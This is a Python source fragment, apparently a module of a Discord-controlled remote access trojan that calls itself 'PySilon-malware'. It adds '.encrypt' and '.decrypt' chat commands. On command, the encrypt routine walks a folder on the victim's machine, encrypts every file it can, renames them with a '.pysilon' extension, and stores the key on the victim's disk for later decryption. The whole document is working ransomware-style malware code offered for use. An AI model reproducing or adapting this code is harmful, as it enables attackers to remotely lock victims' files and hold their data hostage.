from cryptography.fernet import Fernet
import os
import pickle
import psutil
# end of imports

# on message
elif message.content[:8] == '.encrypt':
    #.log Message is "encrypt"
    await message.delete()
    #.log Removed the message 
    if message.content.strip() == '.encrypt':
        embed = discord.Embed(title="📛 Error",description='```Syntax: .encrypt <path to folder>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
    else:
        folder_path = message.content[9:]
        folder_path = folder_path.replace('\\','/')
        current_pid = os.getpid()

        running_processes = set()

        for process in psutil.process_iter(['pid', 'name']):
            try:
                if process.info['pid'] != current_pid:
                    running_processes.add(process.info['name'])
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

        key = Fernet.generate_key()
        cipher_suite = Fernet(key)

        original_file_extensions = []

        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)

                if not file_path.endswith('.pysilon'):
                    _, file_extension = os.path.splitext(file_path)

                    if os.path.basename(file_path) not in running_processes:
                        with open(file_path, 'rb') as f:
                            file_data = f.read()
                        original_file_extensions.append(file_extension)
                        encrypted_data = cipher_suite.encrypt(file_data)
                        
                        new_file_name = os.path.splitext(file_path)[0] + '.pysilon'
                        os.rename(file_path, new_file_name)
                        
                        with open(new_file_name, 'wb') as f:
                            f.write(encrypted_data)

        if original_file_extensions:
            with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\file_extensions.pkl', 'wb') as ext_file:
                pickle.dump(original_file_extensions, ext_file)

        with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\pysilon_encryption.key', 'wb') as key_file:
            key_file.write(key)

        embed = discord.Embed(title="🟢 Success",description=f'```Successfully encrypted the path!```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')

elif message.content[:8] == '.decrypt':
    #.log Message is "decrypt"
    await message.delete()
    #.log Removed the message 
    if message.content.strip() == '.decrypt':
        embed = discord.Embed(title="📛 Error",description='```Syntax: .decrypt <path to folder>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
    else:
        folder_path = message.content[9:]
        folder_path = folder_path.replace('\\','/')

        with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\pysilon_encryption.key', "rb") as key_file:
            key = key_file.read()

        cipher_suite = Fernet(key)

        with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\file_extensions.pkl', "rb") as ext_file:
            original_file_extensions = pickle.load(ext_file)

        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                
                if file_path.endswith('.pysilon'):
                    with open(file_path, 'rb') as f:
                        encrypted_data = f.read()
                    
                    decrypted_data = cipher_suite.decrypt(encrypted_data)
                    
                    original_extension = original_file_extensions.pop(0)
                    new_file_name = os.path.splitext(file_path)[0] + original_extension
                    
                    with open(new_file_name, 'wb') as f:
                        f.write(decrypted_data)

                    os.remove(file_path)

        embed = discord.Embed(title="🟢 Success",description=f'```Successfully decrypted the path!```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
